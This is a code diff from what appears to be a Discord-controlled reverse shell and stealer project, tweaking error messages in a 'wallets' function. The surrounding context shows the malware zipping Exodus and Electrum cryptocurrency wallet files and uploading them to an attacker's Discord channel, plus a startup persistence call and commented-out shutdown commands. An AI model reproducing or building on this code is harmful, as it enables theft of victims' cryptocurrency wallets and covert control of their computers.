@@ -203,14 +203,14 @@ async def wallets(channel):
             wallet = discord.File("Exodus.zip")
             await channel.send(file=wallet)
         except:
-            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+            embed = discord.Embed(title="Error", description=f"Exodus wallet was not found!", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await channel.send(embed=embed)
 
         delete_files(["Exodus.zip"])
     
     else:
-        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+        embed = discord.Embed(title="Error", description=f"Exodus wallet was not found!", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await channel.send(embed=embed)
 
@@ -228,14 +228,14 @@ async def wallets(channel):
             wallet = discord.File("Electrum.zip")
             await channel.send(file=wallet)
         except:
-            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+            embed = discord.Embed(title="Error", description=f"Electrum wallet was not found!", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await channel.send(embed=embed)
 
         delete_files(["Electrum.zip"])
         
     else:
-        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+        embed = discord.Embed(title="Error", description=f"Electrum wallet was not found!", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await channel.send(embed=embed)
         
@@ -949,3 +949,4 @@ else: Startup(sys.argv[0])
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
